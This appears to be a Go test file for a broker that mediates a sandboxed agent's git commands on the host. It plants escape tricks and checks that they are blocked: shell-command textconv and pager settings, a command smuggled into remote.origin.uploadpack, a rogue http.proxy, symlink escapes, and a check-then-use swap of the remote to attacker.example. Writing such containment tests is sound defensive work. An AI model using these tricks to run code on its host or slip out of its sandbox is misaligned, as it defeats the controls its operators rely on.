package hostgit

import (
	"github.com/creack/pty"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

// A1: a textconv driver planted in .git/config runs on the host during pull's diffstat.
func TestAttackTextconvOnPull(t *testing.T) {
	r := newRemoteRig(t)
	root := filepath.Dir(r.ws)
	seed := filepath.Join(root, "seed")
	if err := os.WriteFile(filepath.Join(seed, "f.txt"), []byte("hello\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	run(t, seed, "add", "f.txt")
	run(t, seed, "commit", "-q", "-m", "three")
	run(t, seed, "push", "-q", r.bare, "main")
	b := r.broker(Network{Open: true}) // session starts
	planted := filepath.Join(r.home, "textconv-ran")
	// agent (sandbox can write .git/config and worktree) plants mid-session
	if err := os.WriteFile(filepath.Join(r.ws, ".git", "info", "attributes"), []byte("*.txt diff=evil\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	run(t, r.ws, "config", "diff.evil.textconv", "sh -c 'touch "+planted+"; cat \"$0\"'")
	reason, step, _, err := b.Ask(r.key("c1"), r.ws, "git pull --stat")
	t.Logf("ask=%q step=%q err=%v", reason, step, err)
	out, err := runCmd(t, b.Command(r.ctx("c1"), r.ws, "git pull --stat"))
	t.Logf("pull: %v\n%s", err, out)
	if _, err := os.Stat(planted); err == nil {
		t.Errorf("PLANTED TEXTCONV RAN ON HOST")
	}
}

// A2: a repo-level http.proxy makes host git connect to a host other than the remote with the network off.
func TestAttackHTTPProxyNetworkOff(t *testing.T) {
	r := newRemoteRig(t)
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	var hits atomic.Int32
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			hits.Add(1)
			buf := make([]byte, 512)
			n, _ := c.Read(buf)
			t.Logf("proxy got: %q", buf[:n])
			c.Close()
		}
	}()
	run(t, r.ws, "remote", "set-url", "origin", "https://git.example/team/app.git")
	run(t, r.ws, "config", "http.proxy", "http://"+ln.Addr().String())
	b := r.broker(Network{}) // planted before session start (e.g. by an earlier session)
	reason, step, _, err := b.Ask(r.key("c1"), r.ws, "git fetch")
	t.Logf("ask=%q step=%q err=%v family=%q", reason, step, err, RemoteFamily("git fetch"))
	out, err := runCmd(t, b.Command(r.ctx("c1"), r.ws, "git fetch"))
	t.Logf("fetch: %v\n%s", err, out)
	time.Sleep(200 * time.Millisecond)
	if hits.Load() > 0 {
		t.Errorf("HOST GIT CONNECTED TO PROXY %s WITH NETWORK OFF (approval named only git.example)", ln.Addr())
	}
	// allowlist allowing only git.example
	b2 := r.broker(Network{Allows: func(h string, p uint16) (bool, string) { return h == "git.example", "no" }})
	hits.Store(0)
	reason, step, _, err = b2.Ask(r.key("c2"), r.ws, "git fetch")
	t.Logf("allowlist ask=%q step=%q err=%v", reason, step, err)
	out, err = runCmd(t, b2.Command(r.ctx("c2"), r.ws, "git fetch"))
	t.Logf("fetch: %v\n%s", err, out)
	time.Sleep(200 * time.Millisecond)
	if hits.Load() > 0 {
		t.Errorf("HOST GIT CONNECTED TO PROXY OUTSIDE THE ALLOWLIST")
	}
}

// A3: remote.origin.uploadpack present at session start is sent as the remote command.
func TestAttackUploadPackFromConfig(t *testing.T) {
	r := newRemoteRig(t)
	run(t, r.ws, "config", "remote.origin.uploadpack", "touch PWNED-ON-REMOTE; git-upload-pack")
	b := r.broker(Network{Open: true})
	reason, step, _, err := b.Ask(r.key("c1"), r.ws, "git fetch")
	t.Logf("ask=%q step=%q err=%v", reason, step, err)
	out, err := runCmd(t, b.Command(r.ctx("c1"), r.ws, "git fetch"))
	t.Logf("fetch: %v\n%s", err, out)
	log, _ := os.ReadFile(r.sshLog)
	t.Logf("ssh log:\n%s", log)
	if strings.Contains(string(log), "PWNED-ON-REMOTE") {
		t.Errorf("REPO-CONFIG UPLOADPACK SENT AS REMOTE COMMAND")
	}
}

// A4: a clone "URL" that is host:path but exists as a local folder is cloned locally.
func TestAttackCloneLocalFolderLooksRemote(t *testing.T) {
	r := newRemoteRig(t)
	local := filepath.Join(r.ws, "evil.example:team")
	run(t, r.ws, "init", "-q", "-b", "main", local)
	if err := os.WriteFile(filepath.Join(local, "payload"), []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	run(t, local, "add", "payload")
	run(t, local, "-c", "user.name=a", "-c", "user.email=a@b", "commit", "-q", "-m", "p")
	b := r.broker(Network{})
	line := "git clone evil.example:team cl"
	reason, step, _, err := b.Ask(r.key("c1"), r.ws, line)
	t.Logf("ask=%q step=%q err=%v", reason, step, err)
	if err == nil || !strings.Contains(err.Error(), "local path") {
		t.Errorf("a clone of a local folder spelled host:path was not refused as one: %v", err)
	}
	out, err := runCmd(t, b.Command(r.ctx("c1"), r.ws, line))
	t.Logf("clone: %v\n%s", err, out)
	if _, err := os.Stat(filepath.Join(r.ws, "cl", "payload")); err == nil {
		t.Errorf("CLONE OF host:path WAS A LOCAL CLONE")
	}
}

// A5: clone destination is a symlink in the workspace pointing outside.
func TestAttackCloneIntoSymlinkOut(t *testing.T) {
	r := newRemoteRig(t)
	outside := filepath.Join(filepath.Dir(r.ws), "outside-empty")
	if err := os.MkdirAll(outside, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(r.ws, "dest")); err != nil {
		t.Fatal(err)
	}
	b := r.broker(Network{Open: true})
	line := "git clone git@git.example:team/app.git dest"
	reason, step, _, err := b.Ask(r.key("c1"), r.ws, line)
	t.Logf("ask=%q step=%q err=%v", reason, step, err)
	out, err := runCmd(t, b.Command(r.ctx("c1"), r.ws, line))
	t.Logf("clone: %v\n%s", err, out)
	if _, err := os.Stat(filepath.Join(outside, ".git")); err == nil {
		t.Errorf("CLONE WROTE OUTSIDE THE WORKSPACE THROUGH A SYMLINK")
	}
	// dangling symlink
	gone := filepath.Join(filepath.Dir(r.ws), "outside-new")
	if err := os.Symlink(gone, filepath.Join(r.ws, "dest2")); err != nil {
		t.Fatal(err)
	}
	line = "git clone git@git.example:team/app.git dest2"
	b.Ask(r.key("c2"), r.ws, line)
	out, err = runCmd(t, b.Command(r.ctx("c2"), r.ws, line))
	t.Logf("clone2: %v\n%s", err, out)
	if _, err := os.Stat(filepath.Join(gone, ".git")); err == nil {
		t.Errorf("CLONE WROTE OUTSIDE THROUGH A DANGLING SYMLINK")
	}
}

// A6: .git swapped for a symlink to another repository outside the workspace with the same remotes.
func TestAttackGitSymlinkElsewhere(t *testing.T) {
	r := newRemoteRig(t)
	b := r.broker(Network{Open: true})
	other := filepath.Join(filepath.Dir(r.ws), "other")
	run(t, filepath.Dir(r.ws), "clone", "-q", r.bare, other)
	run(t, other, "remote", "set-url", "origin", "git@git.example:team/app.git")
	run(t, other, "update-ref", "refs/remotes/origin/main", "refs/remotes/origin/main~1")
	before := run(t, other, "rev-parse", "refs/remotes/origin/main")
	if err := os.Rename(filepath.Join(r.ws, ".git"), filepath.Join(r.ws, ".git-old")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(other, ".git"), filepath.Join(r.ws, ".git")); err != nil {
		t.Fatal(err)
	}
	reason, step, _, err := b.Ask(r.key("c1"), r.ws, "git fetch")
	t.Logf("ask=%q step=%q err=%v", reason, step, err)
	out, err := runCmd(t, b.Command(r.ctx("c1"), r.ws, "git fetch"))
	t.Logf("fetch: %v\n%s", err, out)
	after := run(t, other, "rev-parse", "refs/remotes/origin/main")
	if before != after {
		t.Errorf("HOST GIT WROTE REFS OF A REPOSITORY OUTSIDE THE WORKSPACE (%s -> %s)", before, after)
	}
}

// A7: TOCTOU - settings swapped after the broker built the command, before git reads them.
func TestAttackSwapAfterBuild(t *testing.T) {
	r := newRemoteRig(t)
	b := r.broker(Network{})
	if _, _, _, err := b.Ask(r.key("c1"), r.ws, "git fetch"); err != nil {
		t.Fatal(err)
	}
	cmd := b.Command(r.ctx("c1"), r.ws, "git fetch")
	if cmd.Err != nil {
		t.Fatal(cmd.Err)
	}
	// the sandboxed agent rewrites the remote between build and start
	run(t, r.ws, "remote", "set-url", "origin", "git@attacker.example:x/y.git")
	out, err := runCmd(t, cmd)
	t.Logf("fetch: %v\n%s", err, out)
	log, _ := os.ReadFile(r.sshLog)
	t.Logf("ssh log:\n%s", log)
	if strings.Contains(string(log), "attacker.example") {
		t.Errorf("APPROVED FETCH REACHED A HOST REWRITTEN AFTER THE CHECK")
	}
}

// A8: pager configured in .git/config runs when the brokered command's stdout is a terminal.
func TestAttackPagerOnTTY(t *testing.T) {
	r := newRemoteRig(t)
	b := r.broker(Network{Open: true})
	planted := filepath.Join(r.home, "pager-ran")
	run(t, r.ws, "config", "core.pager", "touch "+planted+"; cat")
	run(t, r.ws, "config", "pager.remote", "true")
	cmd := b.Command(r.ctx("c1"), r.ws, "git remote -v")
	if cmd.Err != nil {
		t.Fatal(cmd.Err)
	}
	f, err := pty.Start(cmd)
	if err != nil {
		t.Fatal(err)
	}
	out, _ := io.ReadAll(f)
	_ = cmd.Wait()
	t.Logf("out: %q", out)
	if _, err := os.Stat(planted); err == nil {
		t.Errorf("PLANTED PAGER RAN ON HOST")
	}
}

// A8b: the repository's pager, for a command that is brokered, never runs
// on the host when that command's output is a terminal.
func TestAttackPagerOnTTYBrokered(t *testing.T) {
	r := newRemoteRig(t)
	b := r.broker(Network{Open: true})
	planted := filepath.Join(r.home, "pager-ran")
	run(t, r.ws, "config", "core.pager", "touch "+planted+"; cat")
	run(t, r.ws, "config", "pager.ls-remote", "true")
	run(t, r.ws, "config", "pager.fetch", "true")
	for _, line := range []string{"git ls-remote origin", "git fetch origin"} {
		_, _, _, _ = b.Ask(r.key("p"), r.ws, line)
		cmd := b.Command(r.ctx("p"), r.ws, line)
		if cmd.Err != nil {
			t.Fatal(cmd.Err)
		}
		f, err := pty.Start(cmd)
		if err != nil {
			t.Fatal(err)
		}
		_, _ = io.ReadAll(f)
		_ = cmd.Wait()
		if _, err := os.Stat(planted); err == nil {
			t.Fatalf("%s: the planted pager ran on the host", line)
		}
	}
}
